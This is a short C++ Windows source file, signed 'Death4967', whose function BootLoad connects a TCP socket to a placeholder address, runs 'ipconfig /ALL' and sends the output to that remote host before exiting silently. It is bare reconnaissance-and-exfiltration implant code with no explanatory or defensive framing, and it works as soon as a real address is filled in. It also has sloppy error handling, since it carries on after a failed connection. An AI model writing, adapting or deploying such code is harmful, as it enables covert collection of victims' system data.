/** Death4967 4:37 2025 May 24th */

#include <cstdint>
#include <string>
#include <cstdlib>
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <iostream>
#include <windows.h>
#include <fstream>

#pragma comment(lib, "ws2_32.lib") 

#pragma once 
using namespace std;

WSADATA wsaData;
sockaddr_in addr;
FILE* pipe;
SOCKET s;

void BootLoad() {
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        exit(0);
    }

    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) {
        WSACleanup();
        exit(0);
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(012344);
    addr.sin_addr.s_addr = inet_addr("0.0.0.1"); 

    if (connect(s, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(s);
        WSACleanup();
    }

    pipe = _popen("ipconfig /ALL", "r");
    if (!pipe) {
        closesocket(s);
        WSACleanup();
    }

    char buffer[1024];
    while (fgets(buffer, sizeof(buffer), pipe)) {
        send(s, buffer, strlen(buffer), 0);
    }

    _pclose(pipe);
    closesocket(s);
    WSACleanup();
    return exit(0);
}
